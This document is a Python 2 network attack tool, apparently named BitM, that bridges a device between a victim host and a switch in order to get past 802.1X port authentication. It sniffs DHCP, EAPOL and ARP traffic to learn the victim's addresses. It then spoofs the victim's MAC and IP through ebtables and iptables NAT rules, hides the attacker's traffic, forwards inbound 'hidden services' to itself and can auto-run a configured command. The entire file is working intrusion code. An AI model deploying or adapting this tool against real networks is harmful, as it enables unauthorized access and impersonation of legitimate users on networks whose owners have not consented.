#!/usr/bin/python2
# Author: @fkasler aka ph3eds
# Origional Base script: @jkadijk
# Base decoderthread layout from the Impacket examples.

import sys
import os
import signal
import time
import argparse
import subprocess
import struct
import re
from threading import Thread
import socket
import pty
import logging
#import yaml to read config file
import yaml 

import pcapy
from pcapy import open_live
from scapy.all import *
import impacket
import impacket.eap
import impacket.dhcp
import impacket.ImpactPacket
from impacket.ImpactDecoder import EthDecoder, LinuxSLLDecoder


logging.basicConfig(stream=sys.stderr, level=logging.INFO)

def cmd(c):
    return subprocess.check_output(c, shell=True)

# Signal handler class for Ctrl-c
class SignalHandler():
    def __init__(self, decoder, bridge, netfilter):
        self.decoder = decoder
        self.bridge = bridge
        self.netfilter = netfilter
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signal, frame):
        self.decoder.stop()
        self.bridge.destroy()
        self.netfilter.reset()
        sys.exit(0)

    @staticmethod
    def threadSleep(sec, thread):
        for _ in range(sec):
            if thread.running:  # Stop sleeping when thread stops
                time.sleep(1)


class DecoderThread(Thread):
    def __init__(self, bridge, subnet, arptable):
        # Open interface for capturing.
        self.pcap = open_live(bridge.bridgename, 1500, 0, 100)

        # Query the type of the link and instantiate a decoder accordingly.
        datalink = self.pcap.datalink()
        if pcapy.DLT_EN10MB == datalink:
            self.decoder = EthDecoder()
        elif pcapy.DLT_LINUX_SLL == datalink:
            self.decoder = LinuxSLLDecoder()
        else:
            raise Exception("Datalink type not supported: " % datalink)

        self.bridge = bridge
        self.subnet = subnet
        self.arptable = arptable
        self.running = True

        Thread.__init__(self)

    def run(self):
        # Sniff ad infinitum.
        # PacketHandler shall be invoked by pcap for every packet.
        while self.running:
            self.pcap.dispatch(1, self.packetHandler)

    def stop(self):
        self.running = False
        time.sleep(0.1)

    def packetHandler(self, hdr, data):
        e = self.decoder.decode(data)

        if e.get_ether_type() == impacket.eap.DOT1X_AUTHENTICATION:
            eapol = e.child()
            if eapol.get_packet_type() == eapol.EAP_PACKET:
                eap = eapol.child()
                eapr = eap.child()
                # Only client sends responses with identity
                if eap.get_code() == eap.RESPONSE and eapr.get_type() == eapr.IDENTITY:
                    self.subnet.clientmac = e.get_ether_shost()

        elif e.get_ether_type() == impacket.ImpactPacket.IP.ethertype:
            ip = e.child()
            if isinstance(ip.child(), impacket.ImpactPacket.UDP):
                udp = ip.child()
                if isinstance(udp.child(), impacket.dhcp.BootpPacket):
                    bootp = udp.child()
                    if isinstance(bootp.child(), impacket.dhcp.DhcpPacket):
                        dhcp = bootp.child()
                        if dhcp.getOptionValue('message-type') == dhcp.DHCPDISCOVER:
                            self.subnet.clientmac = e.get_ether_shost()
                        elif dhcp.getOptionValue('message-type') == dhcp.DHCPREQUEST:
                            self.subnet.clientmac = e.get_ether_shost()
                        elif dhcp.getOptionValue('message-type') == dhcp.DHCPACK:
                            self.subnet.clientip = self.subnet.int2ip(bootp["yiaddr"])
                            self.subnet.clientmac = e.get_ether_dhost()
                            self.subnet.gatewayip = self.subnet.int2ip(dhcp.getOptionValue("router")[0])
                            self.subnet.gatewaymac = e.get_ether_shost()
                            self.subnet.subnetmask = self.subnet.ip2array(
                                self.subnet.int2ip(dhcp.getOptionValue("subnet-mask")))
                            self.subnet.subnet = self.subnet.ip2array(self.subnet.int2ip(
                                dhcp.getOptionValue("subnet-mask") & bootp["yiaddr"]))
                            self.subnet.dhcp = True
                        elif dhcp.getOptionValue('message-type') == dhcp.DHCPOFFER:
                            self.subnet.clientip = self.subnet.int2ip(bootp["yiaddr"])
                            self.subnet.clientmac = e.get_ether_dhost()
                            self.subnet.gatewayip = self.subnet.int2ip(dhcp.getOptionValue("router")[0])
                            self.subnet.domain_name = dhcp.getOptionValue("domain name")[0]
                            self.subnet.dns_server = self.subnet.int2ip(dhcp.getOptionValue("domain name server")[0])
                            self.subnet.gatewaymac = e.get_ether_shost()
                            self.subnet.subnetmask = self.subnet.ip2array(
                                self.subnet.int2ip(dhcp.getOptionValue("subnet-mask")))
                            self.subnet.subnet = self.subnet.ip2array(self.subnet.int2ip(
                                dhcp.getOptionValue("subnet-mask") & bootp["yiaddr"]))
                            self.subnet.dhcp = True

            else:
                if not self.subnet.dhcp:
                    ttl = ip.get_ip_ttl()
                    # Uneven but not 1 or 255 ttl means it's probably coming from a router
                    if (ttl % 2) > 0 and ttl > 1 and ttl != 255:
                        self.subnet.gatewaymac = e.get_ether_shost()
                        self.subnet.clientmac = e.get_ether_dhost()
                        self.subnet.clientip = ip.get_ip_dst()

        elif e.get_ether_type() == impacket.ImpactPacket.ARP.ethertype:
            arp = e.child()
            if not self.subnet.dhcp:
                self.subnet.registeraddress(arp.get_ar_tpa())
                self.subnet.registeraddress(arp.get_ar_spa())

            if arp.get_op_name(arp.get_ar_op()) == "REPLY":
                logging.debug("got arp reply")
                self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))
            if arp.get_op_name(arp.get_ar_op()) == "REQUEST":
                self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))


class ArpTable:
    table = {}

    def registeraddress(self, ip_array, hw_address):
        ip = self.printip(ip_array)
        if ip != "0.0.0.0":
            self.table[ip] = hw_address
            logging.debug("%s : %s" % (ip, hw_address))

    def printip(self, ip_array):
        ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
        return ip_string

    def updatekernel(self):
        #for ip, mac in self.table.iteritems():
        #copy the dict first so that we don't crash if the size changes during iteration
        table_copy = self.table.copy()
        #iteritems_copy = self.table.iteritems())
        for ip, mac in table_copy.iteritems():
            os.system("arp -i mibr -s %s %s" % (ip, mac))
            os.system("ip route add %s/32 dev mibr 2>/dev/null" % ip)


# Only supports /24 or smaller
class Subnet:
    def __init__(self, config):
        if config['client_mac'] != '':
            self.clientmac = bytearray.fromhex(re.sub(':','',config['client_mac']))
        else:
            self.clientmac = None
        if config['gateway_mac'] != '':
            self.gatewaymac = bytearray.fromhex(re.sub(':','',config['gateway_mac']))
        else:
            self.gatewaymac = None
        self.subnet = None
        self.minaddress = None
        self.maxaddress = None
        self.clientip = config['client_ip']
        self.gatewayip = config['gateway_ip']
        self.subnetmask = None
        self.dhcp = False
        self.domain_name = config['domain_name']
        self.dns_server = config['dns_server']

    def registeraddress(self, ip_array):
        if self.printip(ip_array) == "0.0.0.0":
            return False
        if ip_array[0] == 169:
            return False
        if self.checksubnet(ip_array):
            if self.minaddress is None or self.minaddress[3] > ip_array[3]:
                self.minaddress = ip_array
            if self.maxaddress is None or self.maxaddress[3] < ip_array[3]:
                self.maxaddress = ip_array
        else:
            logging.debug(self.printip(ip_array))
            logging.debug("[!] Error, duplicate or big subnet detected")

    def checksubnet(self, ip_array):
        if self.subnet is None:
            self.subnet = ip_array
            return True
        if ip_array[0] == self.subnet[0] and ip_array[1] == self.subnet[1]:
            return True
        else:
            return False

    def printip(self, ip_array):
        ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
        return ip_string

    def ip2array(self, ip):
        ip_array = struct.unpack('BBBB', socket.inet_aton(ip))
        return ip_array

    def ip2int(self, addr):
        return struct.unpack("!I", socket.inet_aton(addr))[0]

    def int2ip(self, addr):
        return socket.inet_ntoa(struct.pack("!I", addr))

    def getcidr(self):
        if self.dhcp and self.subnet:
            return bin(self.ip2int(self.printip(self.subnetmask))).count("1")
        else:
            if self.maxaddress and self.minaddress:
                bits = 0
                discovered_hosts = self.maxaddress[3] - self.minaddress[3] + 1
                hosts = 0
                while hosts < discovered_hosts and bits <= 8:
                    bits += 1
                    hosts = 2**bits
                return bits
            else:
                return 0

    def get_gatewaymac(self):
        ethernet = impacket.ImpactPacket.Ethernet()
        temp = ethernet.as_eth_addr(self.gatewaymac)
        return re.sub(r':(\d):', r':0\1:', temp)

    def get_clientmac(self):
        ethernet = impacket.ImpactPacket.Ethernet()
        temp = ethernet.as_eth_addr(self.clientmac)
        return re.sub(r':(\d):', r':0\1:', temp)

    def __str__(self):
        header = "Network config: \n"
        output = ""

        output += "dhcp seen: %s\n" % str(self.dhcp)

        if not self.dhcp and self.minaddress and self.maxaddress:
            output += "cidr bits: %i\n" % self.getcidr()
        elif self.dhcp and self.subnet:
            output += "subnet: %s / netmask: %s / cidr: %i\n" % \
                      (self.printip(self.subnet), self.printip(self.subnetmask), self.getcidr())

        if self.clientip:
            output += "client ip: %s\n" % self.clientip

        if self.clientmac:
            output += "client mac: %s\n" % self.get_clientmac()

        if self.gatewayip:
            output += "gateway ip: %s\n" % self.gatewayip

        if self.gatewaymac:
            output += "gateway mac: %s\n" % self.get_gatewaymac()

        if self.domain_name:
            output += "domain name: %s\n" % self.domain_name

        if self.dns_server:
            output += "DNS server: %s\n" % self.dns_server

        if output == "":
            return "Network config unknown"
        else:
            return header + output


# Create ebtables, arptables and iptables rules based on a subnet object
class Netfilter:
    subnet = None
    bridge = None

    def __init__(self, subnet, bridge):
        self.subnet = subnet
        self.bridge = bridge

        self.inittables()

    def inittables(self):
        self.flushtables()
        os.system("iptables -A OUTPUT -o lo -j ACCEPT")
        os.system("iptables -P OUTPUT DROP")
        os.system("ebtables -P OUTPUT DROP")
        os.system("arptables -P OUTPUT DROP")
        os.system("ebtables -A OUTPUT -p 0x0806 -j DROP")  # _really_ block arp e.g. for nmap
        os.system("ebtables -A OUTPUT -p 0x0808 -j DROP")  # _really_ block arp e.g. for nmap
        os.system("ebtables -A OUTPUT -p 0x8035 -j DROP")  # _really_ block arp e.g. for nmap
        os.system("ebtables -A OUTPUT -p 0x80F3 -j DROP")  # _really_ block arp e.g. for nmap

        #at least allow us to ssh in for now
        os.system("ebtables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        os.system("iptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        os.system("arptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 

    def flushtables(self):
        os.system("iptables -F")
        os.system("iptables -F -t nat")
        os.system("ebtables -F")
        os.system("ebtables -t nat -F")
        os.system("arptables -F")
        os.system("ebtables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        os.system("iptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        os.system("arptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 

    def reset(self):
        self.flushtables()
        os.system("iptables -P OUTPUT ACCEPT")
        os.system("ebtables -P OUTPUT ACCEPT")
        os.system("arptables -P OUTPUT ACCEPT")

    def updatetables(self):
        self.flushtables()
        #os.system("ebtables -t filter -A OUTPUT -s %s -d ff:ff:ff:ff:ff:ff -j DROP" % (self.bridge.ifmacs[self.bridge.switchsideint])) #drop broadcast protocols from our device
        #os.system("ebtables -t filter -A OUTPUT -s %s -d 01:00:5e:00:00:01 -j DROP" % (self.bridge.ifmacs[self.bridge.switchsideint])) #drop broadcast protocols from our device
        #os.system("ebtables -t filter -A OUTPUT -s %s -d 33:33:00:00:00:01 -j DROP" % (self.bridge.ifmacs[self.bridge.switchsideint])) #drop broadcast protocols from our device
        logging.debug("Updating netfilter")
        #we'll use this library to keep things short in a minute...
        sports = {'tcp': ':61000-62000', 'udp': ':61000-62000', 'icmp': ''}

        logging.info("[*] Hiding communication between us and switch")
        #set up an IP for our bridge interface
        os.system("ip addr add 169.254.66.77/24 dev %s" % self.bridge.bridgename)
        logging.info("ip addr add 169.254.66.77/24 dev %s" % self.bridge.bridgename)
        #tag all communication leaving the bridge towards the switch with the victim's MAC address
        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.bridge.ifmacs[self.bridge.switchsideint], self.bridge.switchsideint, self.subnet.get_clientmac()))
        logging.info("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.bridge.ifmacs[self.bridge.switchsideint], self.bridge.switchsideint, self.subnet.get_clientmac()))
        #make sure catch any traffic that might not be caught in the normal POSTROUTING chain. Been burned before by my bridge's MAC :(
        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.bridge.getmac('mibr'), self.bridge.switchsideint, self.subnet.get_clientmac()))
        logging.info("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.bridge.getmac('mibr'), self.bridge.switchsideint, self.subnet.get_clientmac()))
        #set up an internal ARP entry that maps the Switch's MAC to an IP on our bridge's /24 so we can send it traffic using the bridge as an entry point
        os.system("arp -s -i %s 169.254.66.55 %s" % (self.bridge.bridgename, self.subnet.get_gatewaymac()))
        logging.info("arp -s -i %s 169.254.66.55 %s" % (self.bridge.bridgename, self.subnet.get_gatewaymac()))
        #tag all traffic leaving the bridge towards the switch with the victim's IP and NAT using ephemeral ports 61000-62000 for tcp and udp
        for proto in ['tcp', 'udp', 'icmp']:
            os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p %s -j SNAT --to %s%s" %
                      (self.bridge.bridgename,  proto, self.subnet.clientip, sports[proto]))
            logging.info("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p %s -j SNAT --to %s%s" %
                      (self.bridge.bridgename,  proto, self.subnet.clientip, sports[proto]))
        #open up communication between us and the switch
        os.system("ebtables -A OUTPUT -o %s -j ACCEPT" %
                  self.bridge.switchsideint)
        logging.info("ebtables -A OUTPUT -o %s -j ACCEPT" %
                  self.bridge.switchsideint)
        logging.info("[*] Allowing outbound packets on the bridge")
        #allow traffic originating from us to leave the device on the bridge interface
        os.system("iptables -A OUTPUT -o %s -s %s -j ACCEPT" %
                  (self.bridge.bridgename, "169.254.66.77"))
        logging.info("iptables -A OUTPUT -o %s -s %s -j ACCEPT" %
                  (self.bridge.bridgename, "169.254.66.77"))

        #clear out any default route to the network
        logging.info("[*] deleting default route")
        os.system("ip route del default")
        logging.info("ip route del default")
        #set our default route to the IP we gave the switch's MAC on our bridge interface so we can start routing traffic to other hosts
        logging.info("[*] adding new route")
        os.system("ip route add default via 169.254.66.55 dev mibr")
        logging.info("ip route add default via 169.254.66.55 dev mibr")

        #set up a basic single-step traceroute to find the gateway IP as it is commonly missing at this point. We need this so the victim doesn't get kicked off the network
        #use google's dns as the 'destination' for this probing packet
        logging.info("[*] sending scout DHCP request")
        conf.checkIPaddr=False
        while self.subnet.gatewayip == '':
            spoofmac = self.subnet.get_clientmac()
            spoofmacraw = spoofmac.replace(':','').decode('hex')
            #set up a DHCP request from the victim MAC. Include DHCP option 55 to require useful info in the response like gateway, name servers, subnet mask, etc.
            dhcp_discover = Ether(src=spoofmac, dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0', dst='255.255.255.255')/UDP(dport=67, sport=68)/BOOTP(chaddr=spoofmacraw,xid=RandInt())/DHCP(options=[('message-type', 'discover'), (55, "\x01\x03\x05\x06\x0c\x0f\x36"), 'end'])

            dhcp_offer = srp1(dhcp_discover,iface='mibr')
#            logging.info("sending new request")
            my_options = {}
            for pair in dhcp_offer[4].fields['options']:
                my_options[str(pair[0])] = str(pair[1])

            logging.info("DHCP Options:")
            logging.info(my_options)

            try:
                logging.info("echo domain %s >> /etc/resolv.conf" % my_options['domain'])
                os.system(r"echo domain %s >> /etc/resolv.conf" % re.sub(r'[\x00]',r'',my_options['domain']))
            except:
                logging.info("no domain listed")

            try:
                logging.info("echo nameserver %s >> /etc/resolv.conf" % my_options['name_server'])
                os.system(r"echo nameserver %s >> /etc/resolv.conf" % re.sub(r'[\x00]',r'',my_options['name_server']))
            except:
                logging.info("no name servers listed")

            try:
                self.subnet.gatewayip = my_options['router']
                logging.info("Gateway IP: %s" % self.subnet.gatewayip)
            except:
                self.subnet.gatewayip = my_options['server_id']
                logging.info("Gateway IP: %s" % self.subnet.gatewayip)
            finally:
                logging.info("no router listed")
                logging.info("Gateway IP: %s" % self.subnet.gatewayip)

        logging.info("[*] Hiding communication between us and the victim")
        #tag all communication from the bridge towards the victim with the switch's MAC address
        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.bridge.ifmacs[self.bridge.clientsiteint], self.bridge.clientsiteint, self.subnet.get_gatewaymac()))
        logging.info("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.bridge.ifmacs[self.bridge.clientsiteint], self.bridge.clientsiteint, self.subnet.get_gatewaymac()))
        #tag all communicaiton from the bridge towards the victim with the gateway's IP address and NAT using ephemeral ports 61000-62000 for tcp and udp
        for proto in ['tcp', 'udp', 'icmp']:
            os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -d %s -p %s -j SNAT --to %s%s" %
                      (self.bridge.bridgename,  self.subnet.clientip, proto, self.subnet.gatewayip, sports[proto]))
            logging.info("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -d %s -p %s -j SNAT --to %s%s" %
                      (self.bridge.bridgename,  self.subnet.clientip, proto, self.subnet.gatewayip, sports[proto]))
        #open up communication with the victim
        os.system("ebtables -A OUTPUT -o %s -j ACCEPT" %
                  self.bridge.clientsiteint)
        logging.info("ebtables -A OUTPUT -o %s -j ACCEPT" %
                  self.bridge.clientsiteint)

        logging.info("[*] NAT is ready.")

        if config['hidden_service']['switch'].upper() == 'ON':
            print "[*] Create hidden services"
            os.system("iptables -t nat -A PREROUTING -i %s -d %s -p %s --dport %s -j DNAT --to 169.254.66.77:%s" %
                      (self.bridge.bridgename, self.subnet.clientip, config['hidden_service']['kind'].lower, config['hidden_service']['rport'], config['hidden_service']['lport']))
        #clear out any default route to the network
        os.system("ip route del default")
        logging.info("ip route del default")
        #set our default route to the IP we gave the switch's MAC on our bridge interface so we can start routing traffic to other hosts
        os.system("ip route add default via 169.254.66.55 dev mibr")
        logging.info("ip route add default via 169.254.66.55 dev mibr")
#        os.system("ebtables -A OUTPUT -o wlan0 -j ACCEPT") 
#        os.system("iptables -A OUTPUT -o wlan0 -j ACCEPT") 
#        os.system("arptables -A OUTPUT -o wlan0 -j ACCEPT") 
        os.system("ebtables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        logging.info("ebtables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        os.system("iptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        logging.info("iptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        os.system("arptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 
        logging.info("arptables -A OUTPUT -o %s -j ACCEPT" % config['management_int']) 


        if config['auto_run']['switch'].upper() == 'ON':
            myshell = subprocess.call(config['auto_run']['command'])

        print """
************************************************************************
* Warning!                                                             *
* nmap uses raw sockets so NAT will NOT work for host discovery.       *
* For your own safety we block all outgoing ARP traffic with ebtables. *
* You will need to provide the --send-ip parameter to get any results. *
************************************************************************
"""

class Bridge:
    subnet = None
    bridgename = None
    ifmacs = {}
    interfaces = []
    switchsideint = None
    clientsiteint = None

    def __init__(self, bridgename, interfaces, subnet):
        self.bridgename = bridgename
        self.interfaces = interfaces
        self.subnet = subnet
        os.system("brctl addbr %s" % bridgename)
        os.system("macchanger -r %s" % bridgename)

        for interface in [self.bridgename] + self.interfaces:
            self.ifmacs.update({interface: self.getmac(interface)})
            os.system("ip link set %s down" % interface)
            if config['enable_ipv6'].upper() == 'OFF':
                os.system("sysctl -w net.ipv6.conf.%s.disable_ipv6=1" % interface)
            os.system("sysctl -w net.ipv6.conf.%s.autoconf=0" % interface)
            os.system("sysctl -w net.ipv6.conf.%s.accept_ra=0" % interface)
            if interface != bridgename:
                os.system("brctl addif %s %s" % (bridgename, interface))
            os.system("ip link set %s promisc on" % interface)

        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        # Allow 802.1X traffic to pass the bridge
        os.system("echo 8 > /sys/class/net/mibr/bridge/group_fwd_mask")

    def getmac(self, iface):
        res = cmd("ip link show %s" % iface)
        return re.search("..:..:..:..:..:..", res).group(0)

    def srcmac2bridgeint(self, srcmac):
        logging.info("searching for mac: %s ..." % srcmac)
        portnumber = cmd("brctl showmacs %s | grep %s | awk '{print $1}'" %
                         (self.bridgename, srcmac)).rstrip()
        if not portnumber:
            logging.info("portnumber not found bailing")
            return False
        logging.info("portnumber is: %s" % portnumber)
        interface = cmd("brctl showstp %s | grep '(%s)' | head -n1 | awk '{print $1}'" %
                        (self.bridgename, portnumber)).rstrip()
        logging.info("got interface: %s .." % interface)
        if not interface:
            logging.info("error getting interface, is the bridge setup right?")
            return False
        return interface

    def setinterfacesides(self):
        self.switchsideint = self.srcmac2bridgeint(self.subnet.get_gatewaymac())
        logging.debug("switchside interface: %s - %s" % (self.switchsideint, self.ifmacs[self.switchsideint]))
        self.clientsiteint = self.srcmac2bridgeint(self.subnet.get_clientmac())
        #logging.debug("clientside interface: %s - %s" % (self.clientsiteint, self.ifmacs[self.clientsiteint]))

    def up(self):
        for interface in [self.bridgename] + self.interfaces:
            os.system("ip link set %s up" % interface)

    def down(self):
        for interface in [self.bridgename] + self.interfaces:
            os.system("ip link set %s down" % interface)

    def destroy(self):
        self.down()
        os.system("brctl delbr %s" % self.bridgename)
        os.system("sysctl --system")


def main():
    if os.getuid() != 0:
        print "You need to run BitM as root!"
        sys.exit(1)

    dependencies = ['macchanger', 'brctl', 'ip', 'sysctl', 'arp',
                    'iptables', 'arptables', 'ebtables']

    for d in dependencies:
        if os.system("which %s >/dev/null" % d):
            print "Command '%s' is missing. Please install." % d
            sys.exit(1)

    subnet = Subnet(config)
    bridge = Bridge("mibr", [config['iface0'],config['iface1']], subnet)
    netfilter = Netfilter(subnet, bridge)
    arptable = ArpTable()

    bridge.up()
    decoder = DecoderThread(bridge, subnet, arptable)

    sig = SignalHandler(decoder, bridge, netfilter)

    decoder.start()

    print "Listening on %s: net=%s, mask=%s, linktype=%d" % \
          (bridge.bridgename, decoder.pcap.getnet(), decoder.pcap.getmask(), decoder.pcap.datalink())

    print "Bridge MAC: %s" % (bridge.getmac('mibr'))

    while True:
        if subnet.clientip and subnet.gatewaymac and subnet.clientmac:
            print subnet
            logging.info("%s" % subnet)

            bridge.setinterfacesides()
            if config['radio_silence'].upper() == 'OFF':
                netfilter.updatetables()
            else:
                print """
******************************************************
* Radiosilence is enabled.                           *
* Not setting up NAT and disallow outgoing traffic." *
******************************************************\n"""
            break
        else:
            print "not enough info..."
            print subnet
        time.sleep(5)

    # arp setup
    while True:
        f = open(os.path.dirname(os.path.abspath(__file__)) + '/logs/subnetinfo', 'w')
        f.write(str(subnet))
        f.close()
        arptable.updatekernel()
        time.sleep(5)


if __name__ == '__main__':
    f = open(os.path.dirname(os.path.abspath(__file__)) + '/config.yaml','r')
    config = yaml.load(f)
    f.close()

    if (not config['iface0']) or (not config['iface1']):
        parser.error('Either give two interfaces or none to use the ' +
                     'default "eth1 eth2"')
    main()
